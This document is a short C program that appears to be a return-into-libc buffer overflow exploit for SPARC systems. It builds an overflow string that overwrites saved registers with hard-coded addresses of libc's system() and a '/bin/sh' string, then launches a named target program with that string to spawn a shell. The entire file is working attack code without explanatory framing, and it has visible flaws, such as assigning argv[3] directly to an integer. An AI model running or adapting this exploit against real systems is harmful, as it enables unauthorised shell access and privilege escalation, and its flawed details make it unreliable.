#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <dlfcn.h>
#include <signal.h>
#include <setjmp.h>

int step;
jmp_buf env;

void fault()
{
   if (step<0)
      longjmp(env,1);
   else
   {
      printf("Couldn't find /bin/sh at a good place in libc.\n");
      exit(1);
   }
}

int main(int argc, char **argv)
{
   void *handle;
   long systemaddr;
   long shell;

   int bufsz = atoi(argv[2]);
   int nshift = 0;

   char examp[512];
   char *args[4];
   char *envs[1];

   long *lp;
	
   if(argc>3) nshift = argv[3];

   fprintf(stderr,"bufsz = %d, nshift = %d\n", bufsz,nshift);

   systemaddr = 0x2009e4c4;
   shell      = 0x20152248;

   printf("System  set to %lx\n",systemaddr);
   printf("/bin/sh set to %lx\n",shell);

   /* our buffer */
   memset(examp,'A',bufsz);
   lp=(long *)&(examp[bufsz]);

   /* junk */
   *lp++=0xdeadbe01;
   *lp++=0xdeadbe02;

   while(nshift--) *lp++=0xdeadbe03;

   /* the saved %l registers */
   *lp++=0xdeadbe10;
   *lp++=0xdeadbe11;
   *lp++=0xdeadbe12;
   *lp++=0xdeadbe13;
   *lp++=0xdeadbe14;
   *lp++=0xdeadbe15;
   *lp++=0xdeadbe16;
   *lp++=0xdeadbe17;

   /* the saved %i registers */

   *lp++=shell;
   *lp++=0xdeadbe11;
   *lp++=0xdeadbe12;
   *lp++=0xdeadbe13;
   *lp++=0xdeadbe14;
   *lp++=0xdeadbe15;

   *lp++=0xeffffbc8;

   /* the address of system  ( -8 )*/
   *lp++=systemaddr;

   *lp++=0x0;

   args[0]="hole";
   args[1]=examp;
   args[2]="-1";
   args[3]=NULL;

   envs[0]=NULL;

   execve(argv[1],args,envs);
}
